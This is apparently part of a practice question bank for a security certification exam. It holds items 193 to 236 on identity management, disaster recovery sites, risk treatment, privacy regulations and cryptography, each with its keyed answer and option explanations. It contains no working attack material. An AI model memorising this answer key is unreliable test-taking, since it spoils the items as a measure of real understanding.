  {id:193,domain:O,question:"Which of the following is a key step in identity lifecycle management?",options:["Firewall rule creation","Provisioning and deprovisioning user accounts as roles change","Encrypting email communications","Scanning for vulnerabilities"],answer:1,explanation:"Identity lifecycle management covers creating, modifying, and removing access rights as employees join, move, and leave.",optionExplanations:["Firewall rules control network access; identity lifecycle is about user account management.","Provisioning (creating access) and deprovisioning (removing access) are core identity lifecycle activities.","Email encryption is a communication security control, not identity lifecycle management.","Vulnerability scanning is a security assessment activity, not identity management."]},
  {id:194,domain:O,question:"What is a rogue access point?",options:["An access point with a weak WPA2 password","An unauthorized wireless access point connected to the corporate network","An access point broadcasting on a non-standard channel","An access point used for guest Wi-Fi"],answer:1,explanation:"A rogue AP is an unauthorized access point connected to the corporate network, creating an uncontrolled entry point.",optionExplanations:["A weak password is a misconfiguration; a rogue AP is an unauthorized device.","A rogue access point bypasses corporate security controls by creating an unsanctioned wireless entry point.","Non-standard channel configurations are wireless settings; a rogue AP is about authorization.","Guest Wi-Fi is an authorized (often isolated) network; rogue APs are unauthorized."]},
  {id:195,domain:O,question:"Which of the following BEST describes a cold site disaster recovery facility?",options:["A fully operational secondary data center with synchronized hardware and live, continuous data replication providing immediate failover capability","A facility with infrastructure (power, cooling, racks) but no hardware or data — requires days to weeks to be operational","A containerized modular data center that ships to the disaster location and can be made operational within hours of physical arrival","A cloud-based subscription service that stores encrypted data backups offsite and restores them to cloud virtual machines on demand"],answer:1,explanation:"A cold site has the physical infrastructure but requires significant setup time (equipment, data restore) before use.",optionExplanations:["Immediate failover with live replication describes a hot site; a cold site has no hardware or data and takes days to weeks to become operational.","A cold site has physical space, power, and cooling but no pre-configured hardware; recovery takes days to weeks.","A rapidly deployable mobile facility describes a warm or portable site option; a cold site is a pre-existing facility that still requires hardware procurement and setup.","Cloud backup-and-restore describes an offsite cloud recovery service; a cold site is a physical facility with basic infrastructure but requiring hardware installation before use."]},
  {id:196,domain:O,question:"What is a hot site in disaster recovery?",options:["A secondary data center geographically located in a region that experiences a warmer year-round ambient temperature and climate","A fully equipped and operational recovery facility with mirrored data, ready for immediate failover","A facility requiring 1-3 days to become operational","A trailer-mounted portable server deployment unit that can be transported to a disaster-affected site to provide emergency computing capacity"],answer:1,explanation:"A hot site mirrors the production environment and can take over within minutes to hours of a disaster.",optionExplanations:["Geographic climate has no bearing on DR site classification; a hot site is defined by its immediate operational readiness with mirrored systems, not its physical location's temperature.","A hot site replicates production systems and data in real time, enabling near-instantaneous failover.","Requiring 1-3 days to become operational describes a warm site.","A mobile unit describes a portable or containerized recovery solution; a hot site is a fixed secondary facility with fully mirrored systems ready for immediate failover."]},
  {id:197,domain:O,question:"What is the purpose of change management in IT security?",options:["Maintain a continuously updated network topology diagram documenting every switch port, router interface, and firewall connection in the environment","Ensure changes to systems are reviewed, tested, and approved to prevent unintended security impacts","Configure all managed endpoints to automatically download and install operating system patches immediately upon vendor release without approval","Update human resources records and email distribution lists whenever employees transfer departments, change job titles, or leave the organization"],answer:1,explanation:"Change management prevents unauthorized or poorly tested changes from introducing vulnerabilities or outages.",optionExplanations:["Network topology documentation is configuration management; change management governs the review, approval, and testing process before any change is applied to production systems.","Change management requires review, testing, and approval before any system change, preventing security regressions.","Auto-applying patches without review bypasses change management controls; proper change management requires testing and approval to prevent patches from introducing new security issues.","HR record updates are personnel management activities; IT change management specifically controls and tracks changes to systems and infrastructure to prevent unintended security impacts."]},
  {id:198,domain:O,question:"Which of the following BEST describes security orchestration?",options:["Manually configuring security tools one at a time","Integrating and automating multiple security tools to work together efficiently","Training security staff on multiple tools","Centralizing all logs in a single system"],answer:1,explanation:"Orchestration connects disparate security tools via APIs to automate workflows spanning multiple systems.",optionExplanations:["Manual configuration is the opposite of orchestration.","Security orchestration integrates tools (firewall, SIEM, EDR, ticketing) via APIs to automate complex security workflows.","Staff training is an administrative control; orchestration is a technical automation capability.","Centralizing logs is log management or SIEM; orchestration coordinates actions across tools."]},
  {id:199,domain:O,question:"What is the function of an endpoint detection and response (EDR) tool?",options:["Block every executable file from running on an endpoint regardless of its digital signature reputation or vendor certificate status","Monitor endpoint behavior, detect advanced threats, and enable rapid investigation and response","Serve as a complete drop-in replacement for all legacy signature-based antivirus products installed on every managed endpoint device","Apply BitLocker or FileVault full-disk encryption to every managed laptop and desktop device enrolled in the endpoint management system"],answer:1,explanation:"EDR collects telemetry, detects behavioral anomalies, and provides investigation tools including process trees and IOC correlation.",optionExplanations:["Blocking all executables describes an extreme application control posture; EDR monitors behavior and investigates threats at runtime rather than statically preventing all execution.","EDR continuously monitors endpoints for suspicious behavior, provides detection, and supports forensic investigation.","EDR supplements or replaces AV but is defined by behavioral monitoring and investigation capabilities, not simply replacing antivirus signature scanning on endpoints.","Full-disk encryption protects data confidentiality on physical media; EDR detects and responds to active threats through behavioral monitoring of running processes and activities."]},
  {id:200,domain:O,question:"What is the purpose of network traffic analysis (NTA)?",options:["Apply mandatory TLS encryption to every communication flow between internal endpoints traversing the corporate network infrastructure","Analyze patterns of network traffic to detect threats, anomalies, and policy violations","Maintain a threat intelligence-driven blacklist of known-malicious IP addresses and reject all inbound connection attempts from those sources","Configure, update, and replicate DNS zone records across authoritative name servers for all internal and external organizational domains"],answer:1,explanation:"NTA (also called NDR) inspects traffic flows to detect C2 communication, lateral movement, and data exfiltration.",optionExplanations:["Encrypting network traffic is a confidentiality control; NTA inspects traffic metadata and behavioral patterns to detect anomalies and threats, not encrypt communications.","NTA examines network flow data and packet content to detect malicious activity, anomalies, and unauthorized transfers.","IP blocklisting is a specific access control measure; NTA broadly analyzes all traffic patterns and flows to surface anomalies, not just block specific known-bad addresses.","DNS zone management is a network administration task; NTA analyzes network traffic patterns and flows to detect threats, not manage name resolution infrastructure."]},
  {id:201,domain:O,question:"What does a penetration tester do during the 'reconnaissance' phase?",options:["Exploit identified vulnerabilities","Gather information about the target using both passive and active techniques","Report findings to the client","Cover tracks after exploitation"],answer:1,explanation:"Reconnaissance is the information-gathering phase — OSINT, DNS lookups, port scanning to map the attack surface.",optionExplanations:["Exploiting vulnerabilities is the exploitation phase, which comes after reconnaissance.","Reconnaissance collects target information through passive means (OSINT) and active means (port scanning).","Reporting findings is the final phase after testing is complete.","Covering tracks is a post-exploitation activity; reconnaissance comes first."]},
  {id:202,domain:O,question:"What is the purpose of a security audit?",options:["Run scheduled automated vulnerability scans on all production systems to catalog unpatched software weaknesses and configuration flaws","Systematically evaluate security controls, policies, and procedures against a standard or compliance requirement","Deliver annual phishing simulations and interactive security e-learning modules to measure and improve employee security awareness levels","Activate the incident response team to contain, eradicate, and recover from an ongoing security breach affecting organizational systems"],answer:1,explanation:"A security audit provides an independent evaluation of whether controls meet defined standards or compliance requirements.",optionExplanations:["Automated vulnerability scanning is a technical assessment activity; a security audit systematically evaluates controls and procedures against a compliance standard, not just scan for vulnerabilities.","A security audit assesses compliance with policies, frameworks, and regulatory requirements.","Security awareness training educates employees; a security audit evaluates whether controls, policies, and procedures meet defined standards, not train staff or measure their behavior.","Incident response handles active breaches; a security audit proactively evaluates controls against standards to identify gaps before incidents occur, not respond to them."]},
  {id:203,domain:O,question:"Which of the following BEST describes a false negative in security monitoring?",options:["An alert generated for a benign event","A confirmed security incident that was correctly detected","A real attack that was not detected by security controls","A vulnerability scan that finds no issues"],answer:2,explanation:"A false negative is a missed detection — a real threat that security tools failed to identify.",optionExplanations:["A benign event incorrectly flagged is a false positive.","A correctly detected real attack is a true positive.","A false negative means a real attack occurred but was not detected — it slipped through security controls.","No issues found in a scan could be accurate (true negative) or missed (false negative)."]},
  {id:204,domain:O,question:"What is the purpose of a certificate pinning?",options:["Use a hardware security module to generate, store, and protect cryptographic private keys from unauthorized extraction or export","Hardcode a specific certificate or public key into an application to prevent MITM attacks","Optimize TLS connection performance by caching session parameters and using abbreviated handshakes for returning clients and connections","Trigger OCSP or CRL updates automatically whenever a certificate authority detects that a private key has been compromised"],answer:1,explanation:"Certificate pinning rejects any certificate that doesn't match the pinned value, preventing attackers from substituting a fraudulent cert.",optionExplanations:["An HSM securely stores cryptographic keys; certificate pinning hardcodes a specific certificate or public key in an application to reject any other certificate during TLS connections.","Pinning binds an application to a specific certificate/key, preventing attackers from inserting a fraudulent CA-signed cert.","TLS session resumption speeds up repeated connections; certificate pinning associates a specific certificate with an application to prevent MITM attacks using fraudulent certificates.","OCSP and CRL handle certificate revocation status; certificate pinning ties an app to a specific certificate, preventing MITMs from substituting a different valid certificate."]},
  {id:205,domain:O,question:"What is the purpose of user account deprovisioning?",options:["Assign additional privileges when an employee is promoted","Remove access rights when an employee leaves or changes roles","Create new accounts for new employees","Reset passwords for locked accounts"],answer:1,explanation:"Deprovisioning removes all access rights when someone leaves or changes roles, preventing unauthorized access by former employees.",optionExplanations:["Assigning additional privileges is provisioning or access review, not deprovisioning.","Deprovisioning removes access rights promptly when an employee departs or changes roles, closing potential insider threat vectors.","Creating accounts is provisioning, not deprovisioning.","Password resets are account maintenance activities; deprovisioning removes the account or all its access."]},
  {id:206,domain:P,question:"What is risk management in information security?",options:["Applying maximum security controls across every system and process to completely eliminate all identified risk from the organization","Identifying, assessing, and prioritizing risks then applying controls to reduce them to an acceptable level","Shifting the entire financial burden of all potential security incidents to a third-party cyber insurance provider or outsourced contractor","Recording every detected security alert, incident, and near-miss event in a centralized ticketing system to maintain an audit trail"],answer:1,explanation:"Risk management is the ongoing process of identifying risks, evaluating their likelihood/impact, and deciding how to treat them.",optionExplanations:["Eliminating all risk is impossible and not the goal; risk management accepts that some residual risk remains and aims to reduce risk to a defined acceptable level.","Risk management evaluates threats, vulnerabilities, and impact to prioritize risk treatment options.","Risk transfer via insurance is one risk response option, not the complete definition of risk management, which also includes accepting, avoiding, and mitigating risks.","Documenting incidents is an operational security practice; risk management is the structured process of identifying, assessing, prioritizing, and treating risks before they become incidents."]},
  {id:207,domain:P,question:"Which of the following are the four main risk treatment options?",options:["Accept, Avoid, Transfer, Mitigate","Ignore, Report, Escalate, Document","Scan, Patch, Monitor, Report","Plan, Do, Check, Act"],answer:0,explanation:"Risk treatment options: Accept (tolerate), Avoid (eliminate), Transfer (insure/outsource), Mitigate (reduce likelihood/impact).",optionExplanations:["Accept, Avoid, Transfer, and Mitigate (or Reduce) are the four standard risk treatment strategies.","Ignore/Report/Escalate/Document describes process steps, not formal risk treatment options.","Scan/Patch/Monitor/Report describes vulnerability management activities, not risk treatment options.","Plan-Do-Check-Act is the PDCA management cycle from ISO standards."]},
  {id:208,domain:P,question:"What is a business impact analysis (BIA)?",options:["A detailed review of technology procurement costs and vendor contracts to optimize departmental IT budget allocation and spending","An assessment identifying critical business functions and quantifying the impact of disruption","An automated dynamic and static testing assessment that identifies unpatched security vulnerabilities in production web applications and services","An authorized simulated cyberattack on network infrastructure to identify and demonstrate exploitable vulnerabilities before real attackers discover them"],answer:1,explanation:"A BIA identifies critical processes, their dependencies, and quantifies downtime impact to prioritize recovery.",optionExplanations:["A financial IT audit examines costs and spending; a BIA identifies which business functions are critical and quantifies the operational impact if those functions are disrupted.","A BIA determines which business processes are critical, how long they can be down (RTO), and data loss tolerance (RPO).","Application vulnerability scanning finds security flaws in code; a BIA assesses business process criticality and the financial or operational impact of service disruptions.","A penetration test simulates attacks to find technical vulnerabilities; a BIA evaluates business function criticality and disruption impact to inform recovery planning priorities."]},
  {id:209,domain:P,question:"What is the purpose of a risk register?",options:["Log all security incidents","Document identified risks, their likelihood, impact, and treatment plans","Track software patches","Store audit reports"],answer:1,explanation:"A risk register is a living document cataloguing all identified risks with their ratings, owners, and treatment status.",optionExplanations:["Security incident logging is the function of SIEM and incident management systems.","A risk register records each identified risk with probability, impact rating, owner, and treatment plan.","Patch tracking is handled by vulnerability management and patch management systems.","Audit reports document compliance findings; a risk register tracks ongoing risk management."]},
  {id:210,domain:P,question:"What is data classification?",options:["Organizing files into folders","Categorizing data based on its sensitivity to apply appropriate security controls","Encrypting sensitive data","Scanning data for malware"],answer:1,explanation:"Data classification assigns sensitivity levels (e.g., Public, Internal, Confidential, Secret) to guide security controls.",optionExplanations:["File organization is a data management task; data classification applies security-relevant labels.","Data classification assigns sensitivity labels so appropriate access controls, encryption, and handling procedures can be applied.","Encryption is a control applied based on classification; classification itself is the labeling process.","Malware scanning is endpoint security; data classification determines sensitivity levels."]},
  {id:211,domain:P,question:"What does GDPR primarily regulate?",options:["Financial reporting requirements","The processing and protection of personal data of EU residents","Cybersecurity standards for critical infrastructure","Software export controls"],answer:1,explanation:"GDPR (General Data Protection Regulation) governs how organizations collect, process, and store EU residents' personal data.",optionExplanations:["Financial reporting is regulated by laws like Sarbanes-Oxley (SOX); GDPR covers personal data.","GDPR sets strict requirements for processing personal data of EU data subjects, regardless of where the processor is located.","Critical infrastructure cybersecurity is covered by sector-specific regulations like NIS2, not GDPR.","Software export controls are handled by export control laws like EAR/ITAR."]},
  {id:212,domain:P,question:"What is HIPAA primarily concerned with?",options:["Financial data security","Protection of protected health information (PHI) in the United States","Secure software development practices","Consumer credit reporting"],answer:1,explanation:"HIPAA (Health Insurance Portability and Accountability Act) protects the privacy and security of PHI.",optionExplanations:["Financial data is regulated by SOX, PCI DSS, and GLBA; HIPAA covers health information.","HIPAA mandates safeguards for protected health information (PHI) in healthcare organizations and their business associates.","Secure software development is guided by SDLC frameworks and OWASP; HIPAA is health data regulation.","Consumer credit reporting is regulated by FCRA; HIPAA covers health information only."]},
  {id:213,domain:P,question:"What is PCI DSS?",options:["A government regulation for banking","A security standard for organizations that handle credit card data","An encryption protocol for financial transactions","A data classification scheme for financial data"],answer:1,explanation:"PCI DSS (Payment Card Industry Data Security Standard) defines security requirements for cardholder data environments.",optionExplanations:["PCI DSS is a private industry standard created by major card brands, not a government regulation.","PCI DSS sets technical and operational requirements for organizations that store, process, or transmit payment card data.","PCI DSS is a security standard; TLS is the encryption protocol used for secure financial transactions.","PCI DSS contains data classification requirements within it; it is not itself a classification scheme."]},
  {id:214,domain:P,question:"What is the NIST Cybersecurity Framework (CSF)?",options:["A mandatory US government regulation","A voluntary framework with five functions: Identify, Protect, Detect, Respond, Recover","A certification for security professionals","A technical standard for encrypting government data"],answer:1,explanation:"The NIST CSF is a voluntary risk-based framework helping organizations manage cybersecurity risk through five core functions.",optionExplanations:["The NIST CSF is voluntary for most organizations; only some federal requirements make it mandatory.","The NIST CSF organizes cybersecurity activities into five functions: Identify, Protect, Detect, Respond, Recover.","NIST CSF is an organizational framework; Security+ and CISSP are security certifications.","NIST FIPS standards (like FIPS 140) govern encryption for government; CSF is a broader risk management framework."]},
  {id:215,domain:P,question:"What is ISO 27001?",options:["A protocol for encrypting data in transit","An international standard for establishing an Information Security Management System (ISMS)","A US government security clearance","A firewall configuration standard"],answer:1,explanation:"ISO 27001 provides a framework for establishing, implementing, maintaining, and continuously improving an ISMS.",optionExplanations:["Data encryption protocols are technical standards like TLS; ISO 27001 is a management system standard.","ISO 27001 is the globally recognized standard for implementing a structured ISMS to manage information security risks.","Security clearances are government personnel designations; ISO 27001 is an organizational management system standard.","Firewall configuration is a technical control; ISO 27001 defines the overall management system requirements."]},
  {id:216,domain:P,question:"What is the purpose of a security policy?",options:["Provide technical instructions for configuring systems","Define organizational expectations, rules, and responsibilities for information security","Test systems for vulnerabilities","Encrypt sensitive data"],answer:1,explanation:"Security policies establish management's intent and requirements; technical standards and procedures implement them.",optionExplanations:["Technical configuration instructions are documented in technical standards and procedures, not high-level policies.","A security policy defines high-level rules, responsibilities, and consequences for security-related behavior.","Vulnerability testing is a technical activity guided by policy; the policy itself does not perform testing.","Encryption is a technical control; the policy mandates its use without specifying implementation details."]},
  {id:217,domain:P,question:"Which of the following BEST describes third-party risk management?",options:["Managing risks from software bugs","Assessing and managing security risks introduced by vendors, suppliers, and partners","Tracking patch compliance for third-party software","Encrypting data shared with third parties"],answer:1,explanation:"Third-party risk management evaluates vendor security practices and contractual obligations to manage supply chain risk.",optionExplanations:["Software bug risks are managed through patch management and software assurance.","Third-party risk management assesses vendor security posture, contractual controls, and ongoing compliance monitoring.","Patch compliance for vendor software is a component of vulnerability management, not the full scope of third-party risk.","Data encryption when sharing with third parties is a data protection control within a broader third-party risk program."]},
  {id:218,domain:P,question:"What is the purpose of a privacy impact assessment (PIA)?",options:["Conduct dynamic application security testing and static code analysis on a system to identify exploitable security vulnerabilities","Evaluate how a project or system collects, uses, and protects personal information","Label all data assets with a sensitivity classification tier based on regulatory requirements and potential business impact if disclosed","Review financial transaction logs and access records systematically to detect unauthorized modifications or fraudulent activity entries"],answer:1,explanation:"A PIA (or DPIA under GDPR) identifies privacy risks in new systems or processes involving personal data.",optionExplanations:["Security testing finds technical vulnerabilities in systems; a PIA specifically evaluates how a project handles personal information and its impact on individuals' privacy rights.","A PIA assesses the privacy implications of collecting and processing personal data, identifying risks and required controls.","Data classification assigns sensitivity labels to data; a PIA evaluates the collection, use, and protection of personal information within a specific project or system.","Financial fraud auditing examines transaction records; a PIA specifically assesses how personal information is collected, used, and protected within a project or system."]},
  {id:219,domain:P,question:"What is the difference between a threat and a vulnerability?",options:["Threats and vulnerabilities are equivalent and interchangeable security terms that both describe exploitable weaknesses present in systems","A threat is a potential harm; a vulnerability is a weakness that can be exploited by a threat","A vulnerability is a potential harm; a threat is the weakness","Threats only affect external systems; vulnerabilities only affect internal systems"],answer:1,explanation:"Threat = actor or event that could cause harm. Vulnerability = weakness that could be exploited. Risk = threat × vulnerability × impact.",optionExplanations:["They are not equivalent; a threat is an actor or event that could cause harm, while a vulnerability is a specific weakness that a threat could exploit.","A threat is a potential harm or malicious actor; a vulnerability is the weakness the threat exploits to cause harm.","A vulnerability is the weakness, not the harm; the threat is what causes or could cause harm.","Both threats and vulnerabilities apply to both internal and external systems."]},
  {id:220,domain:P,question:"What is the purpose of due diligence in vendor selection?",options:["Request price reductions and favorable payment terms from vendors by comparing quotes against competing bids during procurement negotiations","Investigate a vendor's security practices, financial health, and compliance before entering a business relationship","Deliver security awareness training sessions to third-party contractor personnel who access company systems or facilities during engagements","Perform scheduled penetration testing against third-party vendor infrastructure to identify security weaknesses in their managed environments"],answer:1,explanation:"Due diligence verifies that a vendor's security posture, compliance, and practices meet organizational requirements before signing.",optionExplanations:["Contract negotiation seeks favorable pricing; due diligence investigates a vendor's security posture, financial stability, and compliance history before entering the business relationship.","Due diligence investigates a prospective vendor's security controls, certifications, and compliance to inform risk decisions.","Training vendor employees addresses a security concern but is not due diligence; due diligence investigates the vendor's existing security practices and compliance before contracting.","Pen testing vendor systems is an ongoing assurance activity; due diligence is the pre-contract investigation of a vendor's security posture before establishing the relationship."]},
  {id:221,domain:P,question:"What is a security controls assessment?",options:["Testing software code for bugs","Evaluating whether security controls are implemented correctly and operating effectively","Updating antivirus signatures","Training employees on security policies"],answer:1,explanation:"A controls assessment determines whether security controls are properly implemented and achieving their intended objectives.",optionExplanations:["Code testing is software quality assurance; controls assessment evaluates security mechanisms.","A security controls assessment verifies that controls are implemented, functional, and effective against intended threats.","Updating antivirus signatures is routine security maintenance, not a controls assessment.","Employee training is a people-focused control; assessing whether training is effective would be part of the assessment."]},
  {id:222,domain:P,question:"What is the purpose of a security metrics program?",options:["Generate automated scripts that configure firewall rules and IDS signatures dynamically based on incoming threat intelligence feeds","Measure the effectiveness of security controls and demonstrate security posture to management","Use configuration management platforms to deploy, configure, and update security agents and tooling across all enterprise endpoints","Record which employees have completed mandatory compliance training modules and report completion percentages to the HR management system"],answer:1,explanation:"Security metrics provide quantitative measures (time to patch, MTTD, MTTR, percentage encrypted) to assess and communicate security effectiveness.",optionExplanations:["Automated security configuration is a technical hardening task; a security metrics program measures the effectiveness of controls and communicates security posture data to stakeholders.","Security metrics quantify control effectiveness, enabling data-driven decisions and management communication.","Deploying security tools is an operational task; a security metrics program measures how effectively security controls perform and reports those results to management stakeholders.","Tracking training completion is a subset activity; a security metrics program comprehensively measures security control effectiveness across all domains, not just training compliance."]},
  {id:223,domain:P,question:"What is an acceptable use policy (AUP)?",options:["A contract with cloud providers","A policy defining how employees may use organizational technology resources","A document specifying encryption requirements","A policy for managing third-party vendor access"],answer:1,explanation:"An AUP defines permitted and prohibited uses of company systems, networks, and data by employees.",optionExplanations:["Cloud provider contracts are service agreements; AUPs are internal employee policies.","An AUP sets expectations for appropriate use of IT resources including computers, internet, and email.","Encryption requirements are defined in technical security standards and data protection policies.","Vendor access policies govern third-party access; AUPs govern employee use of company resources."]},
  {id:224,domain:P,question:"What is a SOC 2 report?",options:["A federally mandated cybersecurity certification that organizations must obtain before being authorized to operate critical government information systems","A third-party audit report on a service organization's security, availability, and privacy controls","A technical benchmark specifying required firewall configurations, router hardening settings, and network architecture design standards","A findings document produced by an ethical hacking team describing vulnerabilities and exploits discovered during an authorized offensive test"],answer:1,explanation:"SOC 2 (System and Organization Controls 2) is a third-party audit assessing a service provider's controls for Trust Service Criteria.",optionExplanations:["Government-mandated IT authorizations include FedRAMP or FISMA, not SOC 2; a SOC 2 report is a voluntary third-party audit of a service organization's security controls.","SOC 2 reports are issued by independent auditors evaluating service organizations' controls for security, availability, confidentiality, and privacy.","Network configuration benchmarks are found in standards like CIS Benchmarks; a SOC 2 report audits an organization's security, availability, and privacy controls against Trust Service Criteria.","A penetration test report details discovered vulnerabilities; a SOC 2 report is a formal third-party audit of a service provider's control environment for security and availability."]},
  {id:225,domain:P,question:"Which regulation focuses on protecting consumer financial data in the United States?",options:["GDPR","HIPAA","GLBA","PCI DSS"],answer:2,explanation:"GLBA (Gramm-Leach-Bliley Act) requires financial institutions to protect consumer financial information.",optionExplanations:["GDPR is an EU privacy regulation covering all personal data, not specifically US financial data.","HIPAA protects health information; GLBA protects consumer financial data.","GLBA (Gramm-Leach-Bliley Act) mandates that financial institutions protect the privacy and security of consumer financial information.","PCI DSS is a payment card industry standard, not a consumer financial data protection regulation."]},
  {id:226,domain:G,question:"What is the purpose of a key management lifecycle?",options:["Generate passwords for user accounts","Govern creation, distribution, storage, rotation, and destruction of cryptographic keys","Manage TLS certificate expiration dates","Authenticate users to directory services"],answer:1,explanation:"Key lifecycle management ensures keys are generated securely, distributed safely, rotated regularly, and destroyed when no longer needed.",optionExplanations:["Password management is handled by IAM systems; key management covers cryptographic keys.","The key management lifecycle covers all stages: generation, distribution, storage, rotation, revocation, and destruction.","Certificate lifecycle management is related but distinct from the cryptographic key management lifecycle.","Directory service authentication uses LDAP/Kerberos; key management governs the cryptographic keys themselves."]},
  {id:227,domain:G,question:"What is the difference between authentication and authorization?",options:["They are the same process","Authentication verifies identity; authorization determines what an authenticated user can access","Authorization verifies identity; authentication grants access","Authentication only applies to humans; authorization to systems"],answer:1,explanation:"Authentication proves who you are; authorization determines what you're allowed to do once identified.",optionExplanations:["They are sequential but distinct: authentication comes first, then authorization.","Authentication proves identity (who are you?); authorization determines permissions (what can you do?).","Authorization follows authentication; it never comes before identity verification.","Both authentication and authorization apply to users, services, APIs, and machine identities."]},
  {id:228,domain:T,question:"Which of the following is the MOST effective defense against ransomware?",options:["Strong passwords","Offline, air-gapped backups tested regularly","Antivirus software alone","Blocking all email attachments"],answer:1,explanation:"Immutable, air-gapped backups ensure data can be restored even if ransomware encrypts all connected storage.",optionExplanations:["Strong passwords help prevent unauthorized access but do not recover encrypted data.","Air-gapped backups that cannot be reached by ransomware and are regularly tested are the best recovery option.","Antivirus alone cannot stop all ransomware, especially zero-day or fileless variants; backups are the safety net.","Blocking all attachments is overly restrictive and does not address all ransomware delivery methods (web, USB, RDP)."]},
  {id:229,domain:O,question:"What is the purpose of a tabletop exercise in incident response planning?",options:["Execute a live production failover to the disaster recovery site and validate that all systems and data restore correctly","Walk through a simulated scenario to identify gaps in plans without activating real systems","Run automated vulnerability scanners against live production servers to identify unpatched software weaknesses before attackers can exploit them","Deliver hands-on technical training sessions teaching security staff to operate and configure newly deployed security software and tools"],answer:1,explanation:"Tabletop exercises build team familiarity with IR processes and reveal plan gaps in a low-risk discussion format.",optionExplanations:["A live failover test activates real systems; a tabletop exercise is purely discussion-based and identifies planning gaps without triggering any real system changes or failovers.","Tabletop exercises use hypothetical scenarios to exercise decision-making and communication without disrupting production.","Vulnerability scanning assesses technical security posture; a tabletop exercise verbally walks through incident scenarios to identify gaps in response plans, not scan for vulnerabilities.","Technical training builds operational skills; a tabletop exercise tests the decision-making and coordination processes within existing incident response plans through scenario discussion."]},
  {id:230,domain:P,question:"What is a data retention policy?",options:["A technical standard specifying which encryption algorithms and minimum key lengths must be applied to protect data stored at rest","A policy defining how long data must be kept and when it must be securely deleted","A timetable specifying when full, incremental, and differential backups are performed and how long backup copies are retained","A framework that categorizes organizational data assets by sensitivity level and assigns handling and protection requirements to each tier"],answer:1,explanation:"Data retention policies define minimum and maximum periods for keeping data, balancing legal requirements with storage costs and privacy.",optionExplanations:["An encryption standard defines how data is secured; a data retention policy addresses how long data is kept and when it must be securely deleted, not how it is encrypted.","A data retention policy specifies required retention periods and disposal methods for different data categories.","A backup schedule governs when copies are made; a data retention policy defines how long original operational data and records must be kept before mandatory secure deletion.","A data classification framework labels data by sensitivity; a retention policy defines how long data must be kept and when it must be permanently and securely deleted."]},
  {id:231,domain:G,question:"Which of the following BEST describes a pseudo-random number generator (PRNG) used in cryptography?",options:["Generates numbers that are truly unpredictable","Generates sequences that appear random but are deterministic from a seed","Uses quantum mechanics for randomness","Requires user input to generate each number"],answer:1,explanation:"PRNGs use a seed to generate deterministic but statistically random-appearing sequences; CSPRNGs add unpredictability for crypto use.",optionExplanations:["Truly unpredictable randomness is provided by a TRNG (True Random Number Generator) using physical entropy sources.","PRNGs generate deterministic sequences from a seed value; Cryptographically Secure PRNGs (CSPRNGs) use additional entropy.","Quantum RNGs are TRNGs using quantum phenomena; CSPRNGs are algorithmic.","PRNGs are algorithmic and do not require user input for each value."]},
  {id:232,domain:G,question:"What is the purpose of a message authentication code (MAC)?",options:["Provide confidentiality","Verify message integrity and authenticity using a shared secret key","Create a digital signature using asymmetric keys","Manage network MAC addresses"],answer:1,explanation:"A MAC (e.g., HMAC) uses a shared secret key to create a tag verifying both message integrity and sender authenticity.",optionExplanations:["MACs provide integrity and authenticity, not confidentiality; encryption provides confidentiality.","A MAC is computed with a shared secret key to detect tampering and verify the sender has the shared key.","Digital signatures use asymmetric keys (private key signs); MACs use symmetric shared keys.","Network MAC (Media Access Control) addresses are Layer 2 identifiers, completely unrelated to message authentication codes."]},
  {id:233,domain:G,question:"What type of encryption does TLS use for the bulk of data transfer after the handshake?",options:["Asymmetric encryption exclusively","Symmetric encryption (e.g., AES) for speed","Hashing for data protection","No encryption — only integrity checking"],answer:1,explanation:"TLS uses asymmetric crypto only during the handshake to establish keys; symmetric AES encrypts the actual data.",optionExplanations:["Asymmetric encryption is used only during the TLS handshake for key exchange and authentication.","After the TLS handshake establishes shared session keys, symmetric encryption (AES) encrypts bulk data for speed.","Hashing provides integrity (via HMAC in TLS); it does not encrypt data.","TLS provides both encryption and integrity; it does not rely solely on integrity checking."]},
  {id:234,domain:G,question:"What is an ephemeral key?",options:["A key stored permanently in an HSM","A temporary key generated for a single session and discarded afterward","A backup key used only in emergencies","A key shared between multiple users"],answer:1,explanation:"Ephemeral keys are generated fresh for each session, enabling perfect forward secrecy by not persisting after session end.",optionExplanations:["Permanent keys stored in HSMs are long-term keys; ephemeral keys are the opposite.","Ephemeral keys exist only for the duration of one session, ensuring past sessions cannot be decrypted if the long-term key is compromised.","Emergency backup keys are long-lived recovery keys, not ephemeral.","Shared keys are symmetric keys or key material; ephemeral keys are specific to a single session."]},
  {id:235,domain:G,question:"Which of the following BEST describes the concept of 'security through obscurity'?",options:["A robust security strategy based on hiding system architecture","Relying solely on secrecy of design rather than sound security controls — generally considered insufficient alone","An accepted industry-standard primary security control that uses design secrecy as the foundational and most effective protective layer","Protecting all technical documentation, architecture diagrams, and system runbooks with symmetric encryption to prevent unauthorized disclosure"],answer:1,explanation:"Security through obscurity hides implementation details but is not considered sufficient without actual security controls.",optionExplanations:["Hiding architecture might delay attackers but provides no real protection once discovered.","Security through obscurity relies on secrecy of design rather than the strength of controls; it should supplement, not replace, real security.","Security through obscurity is widely considered insufficient as a primary control; sound security must rely on robust controls that remain effective even if design details are known.","Encrypting documentation is a document security practice; security through obscurity refers to relying on keeping design details secret rather than implementing sound security controls."]},
  {id:236,domain:T,question:"What is a drive-by download attack?",options:["Physically removing a storage device from an unattended workstation to extract sensitive data through direct hardware media access","Malware installed on a system when a user visits a compromised website, without any user interaction","Clicking a malicious link or opening a weaponized attachment in a deceptive phishing email that installs malware on the victim","Copying sensitive files from an unlocked and unattended workstation left accessible in a shared office or public workspace"],answer:1,explanation:"Drive-by downloads exploit browser vulnerabilities to silently install malware when the user visits a compromised page.",optionExplanations:["Physical media theft is a physical security incident; a drive-by download installs malware through a browser when visiting a compromised website, requiring no physical access.","Drive-by downloads exploit browser or plugin vulnerabilities to install malware automatically upon visiting a malicious or compromised site.","Phishing-delivered malware requires user interaction with an email; drive-by downloads occur when visiting a compromised webpage, with malware installing silently without any user action.","Copying files from an unlocked computer is unauthorized physical access; drive-by downloads occur remotely through browser exploitation when a user visits a compromised website."]},
